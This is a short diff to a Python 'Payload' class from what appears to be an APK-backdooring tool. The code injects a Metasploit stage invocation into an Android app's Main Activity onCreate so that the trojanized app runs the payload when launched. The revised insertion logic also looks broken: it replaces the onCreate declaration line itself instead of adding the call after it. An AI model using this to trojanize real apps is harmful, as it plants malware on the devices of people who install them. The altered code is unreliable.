@@ -48,7 +48,11 @@ class Payload:
         to_find = ';->onCreate(Landroid/os/Bundle;)V'
         to_add = 'invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V'
         logging.debug('Inserting the payload invocation in the Main Activity')
-        main_activity_content = main_activity_content.replace(to_find, to_find + '\n    ' + to_add)
+        main_activity_content_lines = main_activity_content.split('\n')
+        main_activity_content_lines[:] = [l if to_find not in l else '    '+to_add for l in main_activity_content_lines]
+        # 
+        # main_activity_content = main_activity_content.replace(to_find, to_find + '\n    ' + to_add)
+        main_activity_content = "\n".join(main_activity_content_lines)
         with open(main_activity_file, 'w') as f:
             logging.debug('Writing the Main Activity file')
             f.write(main_activity_content)
